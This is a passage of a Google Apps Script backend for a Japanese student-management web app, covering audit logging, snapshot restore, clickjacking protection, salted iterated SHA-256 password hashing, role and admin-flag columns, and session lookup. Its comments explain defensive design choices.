// the guard cannot introduce that bug while preventing this one.
function _cellSafeRow_(arr) { return arr.map(_cellSafe_); }

// Append an audit entry. actor = {name, id, role} (any may be missing).
function _logActivity_(actor, action, target, details) {
  try {
    const ss = SpreadsheetApp.getActiveSpreadsheet();
    let log = ss.getSheetByName(AUDIT_SHEET);
    if (!log) {
      log = ss.insertSheet(AUDIT_SHEET);
      log.appendRow(["Timestamp", "User", "ID", "Role", "Action", "Target", "Details"]);
      log.setFrozenRows(1);
    }
    actor = actor || {};
    // The 名前 / ID reaching this function came from the browser — every caller
    // passes currentUser.name and currentUser.id — so the log recorded a CLAIM,
    // and anyone able to call an endpoint could sign someone else's name to it.
    // The parked session wins where there is one, which makes these rows
    // evidence rather than a hint.
    //
    // Rows written by the system itself (the AUTH observe entries, the master
    // PIN notes) pass no session and keep the actor they were given.
    if (_authUser) {
      actor = { name: _authUser.name, id: _authUser.id, role: _authUser.role };
    }
    // The single highest-value place for the guard: 51 call sites feed this, the
    // target/details are built from user input on nearly every action, and
    // Activity_Log is a sheet a human actually opens and reads.
    log.appendRow(_cellSafeRow_([
      new Date(),
      actor.name || "",
      actor.id || "",
      actor.role || "",
      action || "",
      target || "",
      details || ""
    ]));
  } catch (e) {
    // swallow — logging must never block a write
  }
}

// Normalize an actor object coming from the frontend (may be embedded in a
// formObject as _actorName/_actorId, or passed explicitly).
function _actorFrom_(obj, role) {
  obj = obj || {};
  return {
    name: obj._actorName || obj.actorName || "",
    id: obj._actorId || obj.actorId || "",
    role: role || obj._actorRole || ""
  };
}

// Return the most recent audit-log rows (newest first), admin only.
// DIAGNOSTIC (admin-only): compares every distinct 担当 (In Charge) value used on
// bookings in Schedule_DB against the names in Staff_Master, using the same
// normalization the matching code uses. Reports which 担当 values resolve to a
// staff member and which DON'T (those are the ones whose notifications/emails
// would silently miss). Read-only — changes nothing.
function diagnoseInChargeMatching(userRole) {
  if (!_isAdminLevel_(userRole)) throw new Error("管理者のみ実行できます。");
  const ss = SpreadsheetApp.getActiveSpreadsheet();
  const sSheet = ss.getSheetByName("Schedule_DB");
  const stSheet = ss.getSheetByName("Staff_Master");
  if (!sSheet || !stSheet) throw new Error("必要なシートが見つかりません。");

  // Build the set of normalized staff names (with their original form).
  const staffData = stSheet.getDataRange().getDisplayValues();
  let staffByNorm = {};
  let staffNames = [];
  for (let i = 1; i < staffData.length; i++) {
    let original = String(staffData[i][1] || "").trim();
    if (original === "") continue;
    let norm = _normName_(original);
    staffByNorm[norm] = original;
    staffNames.push(original);
  }

  // Collect distinct 担当 values from bookings (Schedule_DB col 12 / idx 11),
  // counting how many bookings use each.
  const data = sSheet.getDataRange().getDisplayValues();
  let counts = {};      // normalized -> { original, count }
  for (let i = 1; i < data.length; i++) {
    let raw = String(data[i][11] || "").trim();
    if (raw === "") continue;
    let norm = _normName_(raw);
    if (!counts[norm]) counts[norm] = { original: raw, count: 0 };
    counts[norm].count++;
  }

  let matched = [], unmatched = [];
  Object.keys(counts).forEach(function(norm){
    let item = { value: counts[norm].original, bookings: counts[norm].count };
    if (staffByNorm[norm]) {
      item.matchesStaff = staffByNorm[norm];
      matched.push(item);
    } else {
      unmatched.push(item);
    }
  });

  // Sort unmatched by most bookings affected (most impactful first).
  unmatched.sort(function(a, b){ return b.bookings - a.bookings; });
  matched.sort(function(a, b){ return b.bookings - a.bookings; });

  return {
    staffNames: staffNames,
    matched: matched,
    unmatched: unmatched,
    summary: matched.length + " 件の担当名が一致、" + unmatched.length + " 件が不一致（通知・メールが届かない可能性）"
  };
}

function getActivityLog(userRole, limit) {
  if (!_isAdminLevel_(userRole)) throw new Error("権限がありません");
  const ss = SpreadsheetApp.getActiveSpreadsheet();
  const log = ss.getSheetByName(AUDIT_SHEET);
  if (!log) return { headers: ["Timestamp","User","ID","Role","Action","Target","Details"], rows: [] };
  const data = log.getDataRange().getDisplayValues();
  const headers = data[0];
  const rows = data.slice(1).reverse(); // newest first
  const max = limit && limit > 0 ? limit : 200;
  return { headers: headers, rows: rows.slice(0, max) };
}

// List available snapshots in the backup spreadsheet, grouped by source sheet.
function getSnapshotList(userRole) {
  if (!_isAdminLevel_(userRole)) throw new Error("権限がありません");
  try {
    const props = PropertiesService.getScriptProperties();
    const id = props.getProperty(BACKUP_PROP_KEY);
    if (!id) return { backupUrl: "", snapshots: [], scheduled: _readBackupReport_() };
    const backup = SpreadsheetApp.openById(id);
    const snaps = backup.getSheets()
      .map(sh => sh.getName())
      .filter(n => n.indexOf("__") !== -1)
      .sort()
      .reverse(); // newest first
    return { backupUrl: backup.getUrl(), snapshots: snaps, scheduled: _readBackupReport_() };
  } catch (e) {
    return { backupUrl: "", snapshots: [], error: e.toString() };
  }
}

// Restore a snapshot back over its source sheet. Admin only. Takes a current
// snapshot of the live sheet first (so the restore itself is undoable).
function restoreSnapshot(userRole, snapshotName, actorName, actorId) {
  if (!_isAdminLevel_(userRole)) throw new Error("権限がありません");
  if (!snapshotName || snapshotName.indexOf("__") === -1) throw new Error("バックアップの指定が正しくありません。（SYS-05）");
  const sourceSheetName = snapshotName.split("__")[0];
  const props = PropertiesService.getScriptProperties();
  const id = props.getProperty(BACKUP_PROP_KEY);
  if (!id) throw new Error("バックアップファイルが見つかりません。");

  const backup = SpreadsheetApp.openById(id);
  const snapSheet = backup.getSheetByName(snapshotName);
  if (!snapSheet) throw new Error("指定のバックアップが見つかりません。（SYS-04）");

  const ss = SpreadsheetApp.getActiveSpreadsheet();
  const target = ss.getSheetByName(sourceSheetName);
  if (!target) throw new Error("復元先のシートが見つかりません: " + sourceSheetName);

  // Snapshot the current live state first, so restoring is itself reversible.
  _snapshotSheet_(sourceSheetName);

  // Copy snapshot data over the target sheet.
  const snapData = snapSheet.getDataRange().getValues();
  target.clearContents();
  if (snapData.length > 0 && snapData[0].length > 0) {
    target.getRange(1, 1, snapData.length, snapData[0].length).setValues(snapData);
    // Restoring Room_Info via bulk setValues can re-coerce leading-zero text
    // fields (WiFi, codes). Re-apply the text formats to preserve them.
    if (sourceSheetName === SHEET_ROOM) {
      try { _applyRoomInfoFormats_(target); } catch (e) {}
    }
  }
  _logActivity_({ name: actorName || "", id: actorId || "", role: userRole }, "バックアップ復元", sourceSheetName, snapshotName);
  return sourceSheetName + " を復元しました。";
}

// --- 1. WEB APP INITIALIZATION ---
// The tab icon belongs to the Google-hosted wrapper page, not to Index.html — a
// <link rel="icon"> inside the iframe has no effect, so it must be set here.
//
// setFaviconUrl validates the URL by FILE EXTENSION, not by what the server
// actually returns: a bare Drive/lh3 link serves a perfectly good image/png and
// is still rejected with "favicon icon image type is not supported". The "#.png"
// is what satisfies that check — a fragment is never sent to the server, so the
// image fetch is unaffected.
//
// ⚠️ The Drive file must stay shared "anyone with the link". Tighten it and the
// URL starts returning a sign-in page; the icon then just quietly disappears.
// Its ID is the FAVICON_DRIVE_FILE_ID script property (see CONFIGURATION); unset,
// there is no icon and the app loads as normal.

// ⚠️ DEFAULT, not ALLOWALL. ALLOWALL let ANY site frame this app, which is a
// clickjacking surface over 建物の削除, ユーザー管理 and the snapshot restore —
// an invisible iframe positioned under a decoy button clicks them as whoever is
// signed in. DEFAULT still permits Google's own wrapper iframe, which is how the
// deployment URL renders normally.
//
// If the app ever stops loading after a deploy, this line is the first suspect:
// revert it alone and the rest of the security work is unaffected.
function doGet(e) {
  const out = HtmlService.createHtmlOutputFromFile('Index')
      .setTitle('学生管理システム')
      .setXFrameOptionsMode(HtmlService.XFrameOptionsMode.DEFAULT);
  // ⚠️ META TAGS MUST BE ADDED HERE, NOT IN Index.html — a <meta> written into the
  // HTML file is ignored. HtmlService serves that file inside a sandboxed iframe on
  // a Google origin, and only addMetaTag() reaches the TOP-LEVEL wrapper page, which
  // is the one the browser takes its viewport from. Without this the whole app
  // renders at ~980px on a phone and zooms out; that is why there was no viewport
  // tag at all.
  //
  // Only four names are accepted by the API (viewport, the two web-app-capable ones,
  // and google-site-verification). The two capable tags are what make 「ホーム画面に
  // 追加」 launch without browser chrome — not a PWA install, which an Apps Script web
  // app cannot do (no top-level document for a manifest, nowhere to put a service
  // worker), but the part staff actually notice.
  try {
    out.addMetaTag('viewport', 'width=device-width, initial-scale=1');
    out.addMetaTag('apple-mobile-web-app-capable', 'yes');
    out.addMetaTag('mobile-web-app-capable', 'yes');
  } catch (err) { /* same rule as the favicon below: never take the app down for chrome */ }
  // A rejected favicon URL THROWS, and doGet throwing takes the entire app down
  // for every user. An icon is never worth that, so it stays strictly optional.
  try {
    const icon = _configValue_(CONFIG_FAVICON_FILE);
    if (icon) out.setFaviconUrl('https://lh3.googleusercontent.com/d/' + icon + '#.png');
  } catch (err) { /* no icon, app still loads */ }
  return out;
}

// ============================================================================
// PASSWORD HASHING
//
// Staff/teacher columns 7-11 (idx 6-10): PasswordHash, Salt, PwIterations,
// PwUpdatedAt, PwMustChange.
//
// Honest about what this is: a salted, iterated SHA-256 chain — not bcrypt or
// scrypt, which Apps Script does not have. It defeats reading the sheet and it
// protects staff who reuse passwords elsewhere. It would not hold indefinitely
// against an offline attack on an exfiltrated sheet, though at that point the
// student data has already gone, which is the worse loss.
//
// ⚠️ WHY SHA-256 IS IMPLEMENTED BY HAND HERE rather than calling Utilities.
// Measured on staging, Utilities.computeHmacSha256Signature costs ~1.25ms PER
// CALL — that is API overhead, not crypto. 10,000 iterations took 9 SECONDS, and
// a ~300ms login budget would have allowed only ~250 iterations, which is
// negligible stretching. Running the loop in process removes the per-call cost
// entirely: the same budget buys ~100,000 iterations. This is a published,
// fully deterministic algorithm, and tests/password.test.js checks it against the
// NIST vectors and against Node's own crypto — it is verified, not trusted.
//
// The iteration count is stored PER ROW, and hashes carry an algorithm tag, so
// both can change later without invalidating everyone's password.
// ============================================================================

// Measured on staging with profilePasswordHash() (Apps Script V8, ~2x slower
// than Node): 10k=61ms, 50k=276ms, 100k=440ms, 200k=865ms, 400k=1689ms.
//
// 100k sits slightly over the 200-400ms budget, deliberately: login already
// carries ~1s of fixed round-trip cost, so 440ms against 276ms is imperceptible
// while doubling the work an offline attacker must do. 200k was the line — at
// ~865ms the login starts to feel slow for no proportionate gain.
//
// Cheap to revisit: PwIterations is stored PER ROW, so changing this only
// affects passwords set afterwards. Nobody's existing password breaks.
const PW_ITERATIONS = 100000;
const PW_MIN_LENGTH = 8;
const PW_ALGO_TAG = "s1";       // bump when the algorithm changes; old tags then fail closed

const _SHA256_K = [
  0x428a2f98|0,0x71374491|0,0xb5c0fbcf|0,0xe9b5dba5|0,0x3956c25b|0,0x59f111f1|0,0x923f82a4|0,0xab1c5ed5|0,
  0xd807aa98|0,0x12835b01|0,0x243185be|0,0x550c7dc3|0,0x72be5d74|0,0x80deb1fe|0,0x9bdc06a7|0,0xc19bf174|0,
  0xe49b69c1|0,0xefbe4786|0,0x0fc19dc6|0,0x240ca1cc|0,0x2de92c6f|0,0x4a7484aa|0,0x5cb0a9dc|0,0x76f988da|0,
  0x983e5152|0,0xa831c66d|0,0xb00327c8|0,0xbf597fc7|0,0xc6e00bf3|0,0xd5a79147|0,0x06ca6351|0,0x14292967|0,
  0x27b70a85|0,0x2e1b2138|0,0x4d2c6dfc|0,0x53380d13|0,0x650a7354|0,0x766a0abb|0,0x81c2c92e|0,0x92722c85|0,
  0xa2bfe8a1|0,0xa81a664b|0,0xc24b8b70|0,0xc76c51a3|0,0xd192e819|0,0xd6990624|0,0xf40e3585|0,0x106aa070|0,
  0x19a4c116|0,0x1e376c08|0,0x2748774c|0,0x34b0bcb5|0,0x391c0cb3|0,0x4ed8aa4a|0,0x5b9cca4f|0,0x682e6ff3|0,
  0x748f82ee|0,0x78a5636f|0,0x84c87814|0,0x8cc70208|0,0x90befffa|0,0xa4506ceb|0,0xbef9a3f7|0,0xc67178f2|0
];

// SHA-256 over a byte array, returning 32 bytes. Standard FIPS 180-4.
function _sha256Bytes_(bytes) {
  let h0=0x6a09e667|0,h1=0xbb67ae85|0,h2=0x3c6ef372|0,h3=0xa54ff53a|0,
      h4=0x510e527f|0,h5=0x9b05688c|0,h6=0x1f83d9ab|0,h7=0x5be0cd19|0;

  const len = bytes.length;
  // Message + 0x80 + zero padding + 8-byte length, rounded up to a 64-byte block.
  const blocks = ((len + 8) >> 6) + 1;
  const m = new Int32Array(blocks * 16);
  for (let i = 0; i < len; i++) m[i >> 2] |= (bytes[i] & 0xff) << (24 - (i % 4) * 8);
  m[len >> 2] |= 0x80 << (24 - (len % 4) * 8);
  // Length in BITS in the final two words. Only the low word is set: a password
  // long enough to need the high word does not exist.
  m[blocks * 16 - 1] = len * 8;

  const w = new Int32Array(64);
  for (let b = 0; b < blocks; b++) {
    for (let j = 0; j < 16; j++) w[j] = m[b * 16 + j];
    for (let j = 16; j < 64; j++) {
      const x = w[j-15], y = w[j-2];
      const s0 = ((x>>>7)|(x<<25)) ^ ((x>>>18)|(x<<14)) ^ (x>>>3);
      const s1 = ((y>>>17)|(y<<15)) ^ ((y>>>19)|(y<<13)) ^ (y>>>10);
      w[j] = (s0 + w[j-7] + s1 + w[j-16]) | 0;
    }
    let a=h0,b2=h1,c=h2,d=h3,e=h4,f=h5,g=h6,hh=h7;
    for (let j = 0; j < 64; j++) {
      const S1 = ((e>>>6)|(e<<26)) ^ ((e>>>11)|(e<<21)) ^ ((e>>>25)|(e<<7));
      const ch = (e & f) ^ (~e & g);
      const t1 = (hh + S1 + ch + _SHA256_K[j] + w[j]) | 0;
      const S0 = ((a>>>2)|(a<<30)) ^ ((a>>>13)|(a<<19)) ^ ((a>>>22)|(a<<10));
      const maj = (a & b2) ^ (a & c) ^ (b2 & c);
      const t2 = (S0 + maj) | 0;
      hh=g; g=f; f=e; e=(d+t1)|0; d=c; c=b2; b2=a; a=(t1+t2)|0;
    }
    h0=(h0+a)|0; h1=(h1+b2)|0; h2=(h2+c)|0; h3=(h3+d)|0;
    h4=(h4+e)|0; h5=(h5+f)|0; h6=(h6+g)|0; h7=(h7+hh)|0;
  }

  const out = new Array(32);
  const hs = [h0,h1,h2,h3,h4,h5,h6,h7];
  for (let i = 0; i < 8; i++) {
    out[i*4]   = (hs[i]>>>24) & 0xff;
    out[i*4+1] = (hs[i]>>>16) & 0xff;
    out[i*4+2] = (hs[i]>>>8)  & 0xff;
    out[i*4+3] =  hs[i]       & 0xff;
  }
  return out;
}

// UTF-8 encode without Utilities — this runs inside the hash loop's hot path.
function _utf8Bytes_(str) {
  const s = String(str);
  let out = [];
  for (let i = 0; i < s.length; i++) {
    let c = s.charCodeAt(i);
    if (c < 0x80) out.push(c);
    else if (c < 0x800) { out.push(0xc0|(c>>6), 0x80|(c&63)); }
    else if (c >= 0xd800 && c <= 0xdbff && i + 1 < s.length) {
      const c2 = s.charCodeAt(i+1);
      const cp = 0x10000 + ((c - 0xd800) << 10) + (c2 - 0xdc00);
      out.push(0xf0|(cp>>18), 0x80|((cp>>12)&63), 0x80|((cp>>6)&63), 0x80|(cp&63));
      i++;
    } else { out.push(0xe0|(c>>12), 0x80|((c>>6)&63), 0x80|(c&63)); }
  }
  return out;
}

const _B64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
function _bytesToBase64_(bytes) {
  let s = "";
  for (let i = 0; i < bytes.length; i += 3) {
    const b0 = bytes[i], b1 = bytes[i+1], b2 = bytes[i+2];
    s += _B64[b0 >> 2];
    s += _B64[((b0 & 3) << 4) | ((b1 === undefined ? 0 : b1) >> 4)];
    s += (b1 === undefined) ? "=" : _B64[((b1 & 15) << 2) | ((b2 === undefined ? 0 : b2) >> 6)];
    s += (b2 === undefined) ? "=" : _B64[b2 & 63];
  }
  return s;
}

// Returns "s1$<base64>". The tag lets a future algorithm change fail closed on
// old hashes instead of silently accepting them.
function _hashPassword_(password, salt, iterations) {
  const n = parseInt(iterations, 10) || PW_ITERATIONS;
  let bytes = _sha256Bytes_(_utf8Bytes_(String(salt) + "|" + String(password)));
  const saltBytes = _utf8Bytes_(String(salt));
  for (let i = 1; i < n; i++) {
    // Re-mix the salt each round so the chain cannot be precomputed
    // independently of it.
    bytes = _sha256Bytes_(bytes.concat(saltBytes));
  }
  return PW_ALGO_TAG + "$" + _bytesToBase64_(bytes);
}

// Constant-ish comparison. Timing is not a practical attack across a ~1s round
// trip with an escalating failure delay in front of it, but not short-circuiting
// costs nothing.
function _hashesEqual_(a, b) {
  const x = String(a || ""), y = String(b || "");
  if (x.length !== y.length) return false;
  let diff = 0;
  for (let i = 0; i < x.length; i++) diff |= (x.charCodeAt(i) ^ y.charCodeAt(i));
  return diff === 0;
}

function _newSalt_() { return Utilities.getUuid(); }

// Time the hash at several iteration counts so PW_ITERATIONS is chosen from a
// measurement rather than a guess. Login already costs ~1s of fixed overhead,
// so aim for roughly 200-400ms of hashing on top.
function profilePasswordHash() {
  _requireMaintenanceUnlock_("profilePasswordHash");
  const salt = _newSalt_();
  let lines = ["", "--- password hash cost, pure-JS SHA-256 (pick the largest that fits ~200-400ms) ---"];
  [10000, 50000, 100000, 200000, 400000].forEach(function (n) {
    const t0 = Date.now();
    _hashPassword_("correct horse battery staple", salt, n);
    const ms = Date.now() - t0;
    lines.push("  " + String(n).padStart(6) + " iterations: " + String(ms).padStart(6) + " ms"
             + (ms >= 200 && ms <= 400 ? "   <- in budget" : ""));
  });
  lines.push("");
  lines.push("  PW_ITERATIONS is currently " + PW_ITERATIONS + ".");
  const out = lines.join("\n") + "\n";
  Logger.log(out);
  return out;
}

// Idempotent. Adds the password columns to both master sheets, leaving every
// existing index alone — column 2 (PIN) in particular keeps its position, because
// this codebase addresses these sheets positionally and shifting indices is the
// hazard TECHNICAL_REFERENCE §4.3 exists to warn about. PIN is blanked at the end
// of the rollout, not removed.
const ACCOUNT_COLS = 11;   // 0-5 legacy, 6 hash, 7 salt, 8 iterations, 9 updated, 10 mustChange
const ACCOUNT_HEADERS = ["PasswordHash", "Salt", "PwIterations", "PwUpdatedAt", "PwMustChange"];

// ⚠️ Staff_Master never stored a role. Every row in it was 'sales', hardcoded in
// getSystemUsers and derived from the sheet name everywhere else — which is why
// `admin` worked throughout Code.js but no account could actually hold it. Custom
// roles need somewhere to live, so the role goes in column 12, AFTER the password
// block, leaving columns 1-11 exactly as they are.
//
// Teacher_Master deliberately does NOT use it: 'teacher' selects that sheet in
// five places, one inside _resolveUserById_ which runs on every login. A teacher
// row whose column 12 said something else would be unreachable by the very lookup
// that found it.
const STAFF_COLS = 12;
const STAFF_ROLE_IDX = 11;

// 管理者権限 on the PERSON, column 13 in BOTH Staff_Master and Teacher_Master.
//
// ⚠️ Why per-user and not just per-role. The role flag cannot reach a 教務 manager:
// 'teacher' selects Teacher_Master in five places including _resolveUserById_ on the
// login path, and the client tests `currentUser.role === 'teacher'` LITERALLY to set
// currentTeacherId — their personal 面接スケジュール. Moving them to a flagged custom
// role would buy admin power at the cost of their own schedule. On their own row they
// keep both.
//
// Column 12 stays the Staff-only Role column and is left unused in Teacher_Master, as
// it already is; sharing 13 keeps one constant for both sheets.
const ADMIN_FLAG_COL = 13;
const ADMIN_FLAG_IDX = 12;

// ⚠️ Fails closed, like the role flag in _roles_(): only a literal "Y". A blank, a
// stray value, and a row on a sheet that has never been widened all read false.
// For a privilege flag that is the only safe direction.
function _adminFlagFromRow_(row) {
  return String((row || [])[ADMIN_FLAG_IDX] || "").trim().toUpperCase() === "Y";
}

// Added on demand, never by a migration that must run first — same reasoning as
// _ensureAccountColumns_ and _ensureRoleColumn_: a deploy-ordering slip on an account
// sheet is a lockout, not a cosmetic bug.
function _ensureAdminFlagColumn_(sheet) {
  try {
    if (sheet.getMaxColumns() < ADMIN_FLAG_COL) {
      sheet.insertColumnsAfter(sheet.getMaxColumns(), ADMIN_FLAG_COL - sheet.getMaxColumns());
    }
    const cell = sheet.getRange(1, ADMIN_FLAG_COL);
    if (String(cell.getDisplayValue() || "").trim() === "") cell.setValue("管理者権限");
  } catch (e) { /* best-effort; a genuinely un-widenable sheet surfaces at the write */ }
}

// Read a Staff_Master row's role, refusing anything that would be an escalation.
// This value comes from a spreadsheet CELL, so it is treated as untrusted input:
// blank, unknown, or 'master' all fall back to 'sales'. Failing to 'sales' rather
// than to nothing matters — an account resolving to no role at all logs in to an
// empty app with no error to explain why.
function _staffRoleFromRow_(row) {
  const raw = String((row || [])[STAFF_ROLE_IDX] || "").trim();
  if (raw === "" || raw === "master" || raw === "teacher") return "sales";
  return _roleByKey_(raw) ? raw : "sales";
}

// The Role column is added on demand, for the reason recorded on
// _ensureAccountColumns_: relying on a migration having run first turns a deploy
// ordering slip into a lockout.
function _ensureRoleColumn_(sheet) {
  try {
    if (sheet.getMaxColumns() < STAFF_COLS) {
      sheet.insertColumnsAfter(sheet.getMaxColumns(), STAFF_COLS - sheet.getMaxColumns());
    }
    const cell = sheet.getRange(1, STAFF_COLS);
    if (String(cell.getDisplayValue() || "").trim() === "") cell.setValue("Role");
  } catch (e) { /* best-effort; an un-widenable sheet surfaces at the write */ }
}

function migrateAddPasswordColumns() {
  _requireMaintenanceUnlock_("migrateAddPasswordColumns");
  const ss = SpreadsheetApp.getActiveSpreadsheet();
  let done = [];
  ["Staff_Master", "Teacher_Master"].forEach(function (name) {
    const sh = ss.getSheetByName(name);
    if (!sh) { done.push(name + ": not found"); return; }

    const headers = sh.getRange(1, 1, 1, Math.max(sh.getLastColumn(), 1)).getDisplayValues()[0];
    if (headers[6] === ACCOUNT_HEADERS[0] && headers[10] === ACCOUNT_HEADERS[4]) {
      done.push(name + ": already migrated (" + sh.getMaxColumns() + " columns)");
      return;
    }

    _snapshotSheet_(name);
    const have = sh.getMaxColumns();
    if (have < ACCOUNT_COLS) sh.insertColumnsAfter(have, ACCOUNT_COLS - have);
    sh.getRange(1, 7, 1, ACCOUNT_HEADERS.length).setValues([ACCOUNT_HEADERS]);
    // Hash and salt are opaque strings; keep the columns text so nothing is
    // coerced into a number or a date.
    sh.getRange(2, 7, Math.max(sh.getMaxRows() - 1, 1), ACCOUNT_HEADERS.length).setNumberFormat("@");
    done.push(name + ": migrated " + have + " -> " + sh.getMaxColumns() + " columns");
  });
  SpreadsheetApp.flush();
  return done.join("\n");
}

// Read-only pre-flight. Run BEFORE the cutover: a user with no email can never
// log in afterwards, and a duplicate email makes the lookup ambiguous.
// Also doubles as the migration progress view — re-run until nobody lacks a hash.
function auditAccountReadiness() {
  _requireMaintenanceUnlock_("auditAccountReadiness");
  const ss = SpreadsheetApp.getActiveSpreadsheet();
  let noEmail = [], dupes = [], noHash = [], odd = [];
  let byEmail = {};

  ["Staff_Master", "Teacher_Master"].forEach(function (name) {
    const sh = ss.getSheetByName(name);
    if (!sh) return;
    const rows = sh.getDataRange().getDisplayValues();
    for (let i = 1; i < rows.length; i++) {
      const id = String(rows[i][0] || "").trim();
      if (!id) continue;
      const label = name + " / " + id + " " + String(rows[i][1] || "").trim();
      const rawEmail = String(rows[i][3] || "");
      const email = rawEmail.trim().toLowerCase();

      if (email === "") { noEmail.push(label); }
      else {
        if (rawEmail !== rawEmail.trim() || rawEmail !== rawEmail.toLowerCase()) {
          odd.push(label + "  \"" + rawEmail + "\"");
        }
        if (byEmail[email]) dupes.push(email + "  →  " + byEmail[email] + "  &  " + label);
        else byEmail[email] = label;
      }
      if (String(rows[i][6] || "").trim() === "") noHash.push(label);
    }
  });

  let out = ["", "--- account readiness ---"];
  const section = function (title, list, note) {
    out.push("");
    out.push(list.length === 0 ? "✅ " + title + ": none" : "❌ " + title + ": " + list.length);
    if (note && list.length) out.push("   " + note);
    list.forEach(function (l) { out.push("   • " + l); });
  };
  section("users with no email (cannot log in after cutover)", noEmail, "fill these in before shipping");
  section("duplicate emails (ambiguous login)", dupes, "each email must map to exactly one person");
  section("emails with stray case/whitespace", odd, "matching trims and lowercases, so these still work — but tidy them");
  section("users with no password yet (migration pending)", noHash, "they can still log in with their old PIN once");

  out.push("");
  out.push(noHash.length === 0
    ? "All users have set a password — column 2 (PIN) can now be blanked."
    : noHash.length + " user(s) still to migrate. Do NOT blank the PIN column yet.");

  const s = out.join("\n") + "\n";
  Logger.log(s);
  return s;
}


// --- AUTHENTICATION ENGINE (MASTER + STAFF + TEACHERS) ---

// Turn one master-sheet row into the user object the rest of the app expects.
// Single place so the staff and teacher paths cannot drift apart.
function _userFromRow_(row, roleName) {
  let perms = String(row[5] || "").trim();
  if (perms === "") {
    perms = roleName === "teacher"
      ? "view_teacher_schedule"
      : "view_students,export_students,view_dorms,edit_dorms,export_dorms,view_admissions,edit_admissions,export_admissions,view_interview_results,entry_interview_results,view_shinsei,edit_shinsei,export_shinsei";
  }
  const def = _roleByKey_(roleName);
  // ⚠️ Admin level now has TWO sources: the role's flag and the person's own row.
  // Carried on the session so _isAdminLevel_ can consult it without re-reading the
  // sheet on every guarded call.
  const rowAdmin = _adminFlagFromRow_(row);
  return {
    role: roleName,
    adminUser: rowAdmin,
    // The server decides; the client only mirrors it for UI gating. A department
    // manager gets this true while roleLabel still reads 教務部 — and a 教務 flagged
    // on their own row gets it while role stays literally 'teacher', which is what
    // keeps their personal schedule working.
    isAdmin: !!(def && def.admin) || rowAdmin || roleName === "admin" || roleName === "master",
    // Carried on the user so the header badge can name a custom role without a
    // second round trip — getRoles needs manage_users, which most users lack.
    roleLabel: def ? def.label : roleName,
    id: String(row[0]).trim(),
    name: String(row[1]).trim(),
    email: String(row[3] || "").trim(),
    notifications: String(row[4] || "").trim() !== "OFF",
    permissions: perms
  };
}

// Locate an account by email across both master sheets. Returns the sheet name,
// 1-based row index and the raw row, or null.
//
// Matching trims and lowercases: a stray capital in the sheet must not lock
// somebody out. auditAccountReadiness reports duplicates, and this deliberately
// returns the FIRST match rather than guessing between them.
function _findAccountByEmail_(email) {
  const want = String(email || "").trim().toLowerCase();
  if (want === "") return null;
  const names = ["Staff_Master", "Teacher_Master"];
  const roles = { "Staff_Master": "sales", "Teacher_Master": "teacher" };
  const tabs = _readTabs_(names);
  for (let n = 0; n < names.length; n++) {
    const rows = tabs[names[n]] || [];
    for (let i = 1; i < rows.length; i++) {
      if (String(rows[i][3] || "").trim().toLowerCase() === want) {
        const role = names[n] === "Staff_Master" ? _staffRoleFromRow_(rows[i]) : roles[names[n]];
        return { sheetName: names[n], role: role, rowIndex: i + 1, row: rows[i] };
      }
    }
  }
  return null;
}

// Verify a submitted password against an account row.
// Returns { ok, mustSetPassword } — never throws, so the caller controls the
// error message and the failure delay.
//
// The legacy branch is what makes the migration self-completing: while a user has
// no hash, their old plaintext PIN works ONCE and forces a password set. The
// moment a hash exists that branch stops applying to them, so it can never become
// a permanent PIN backdoor.
function _verifyAccountPassword_(row, password) {
  const hash = String(row[6] || "").trim();
  const salt = String(row[7] || "").trim();
  const iters = String(row[8] || "").trim();

  if (hash !== "" && salt !== "") {
    // Fail closed on anything not produced by the current algorithm: an untagged
    // or differently-tagged hash is treated as unusable rather than compared.
    if (hash.indexOf(PW_ALGO_TAG + "$") !== 0) return { ok: false, mustSetPassword: false };
    const ok = _hashesEqual_(_hashPassword_(password, salt, iters), hash);
    return { ok: ok, mustSetPassword: ok && String(row[10] || "").trim() === "Y" };
  }

  const legacyPin = String(row[2] || "").trim();
  if (legacyPin !== "" && String(password) === legacyPin) {
    return { ok: true, mustSetPassword: true };
  }
  return { ok: false, mustSetPassword: false };
}

// _resolveUserByPin used to live here. It scanned both master sheets for a
// matching plaintext PIN — deleted with the move to email + hashed passwords, so
// there is no second, weaker way into the app left in the file. Login now goes
// through _findAccountByEmail_ + _verifyAccountPassword_; _resolveUserById_ below is
// still used by session resume and is unrelated.

// Re-fetch a user's current data by role+id (used on session resume so that
// permission changes / deletions take effect immediately).
function _resolveUserById_(role, id) {
  // Accept the legacy "admin" role for MASTER so sessions issued before the
  // role split still resolve instead of falling through to Staff_Master.
  if ((_isMasterRoleLiteral_(role) || role === "admin") && id === "MASTER") {
    // Clearing SYSTEM_PIN is how you disable master, so it has to kill live
    // master sessions too — otherwise the account stays usable for the rest of
    // the token's life on exactly the projects where it was never configured.
    if (_systemPin_() === "") return null;
    return { role: "master", id: "MASTER", name: "システム", email: "", notifications: false, permissions: "ALL" };
  }
  const sheetName = role === "teacher" ? "Teacher_Master" : "Staff_Master";
  // Via _readTabs_ so this joins the boot batchGet instead of paying its own
  // ~200ms round trip. A missing tab yields [], which falls through to null
  // exactly as the old getSheetByName guard did.
  const data = _readTabs_([sheetName])[sheetName] || [];
  for (let i = 1; i < data.length; i++) {
    if (String(data[i][0]).trim() === String(id).trim()) {
      // ⚠️ DELEGATES to _userFromRow_ — it used to build the same object by hand, and
      // the copy drifted the moment 管理者権限 was added to the person's row: login went
      // through _userFromRow_ and carried the flag, session RESUME came through here and
      // did not. The symptom was a flagged 営業 seeing the admin panel (drawn from the
      // login payload) while every call behind it threw 権限がありません (guarded from the
      // resumed session). Exactly the failure _calCellState is kept single for.
      //
      // ⚠️ The live role is resolved FIRST and passed in: the session's stored role can
      // be stale if the account was moved between staff roles since the token was
      // issued, and the row's own cell is the authority.
      const liveRole = sheetName === "Staff_Master" ? _staffRoleFromRow_(data[i]) : role;
      return _userFromRow_(data[i], liveRole);
    }
  }
  return null;
}

const SESSION_SHEET = 'Sessions';

function _getSessionSheet_() {
  const ss = SpreadsheetApp.getActiveSpreadsheet();
  let sh = ss.getSheetByName(SESSION_SHEET);
  if (!sh) {
    sh = ss.insertSheet(SESSION_SHEET);
    sh.appendRow(["Token", "Role", "ID", "Name", "Created", "LastSeen"]);
    sh.setFrozenRows(1);
    try { sh.hideSheet(); } catch (e) {}
  }
  return sh;
}

// ⚠️ SESSION TIMES ARE STORED AS TEXT IN ONE FIXED FORMAT, and never read back from a Date's
// display. Production displayed them MONTH-first — "9/11/2026 10:42:07", the default for an
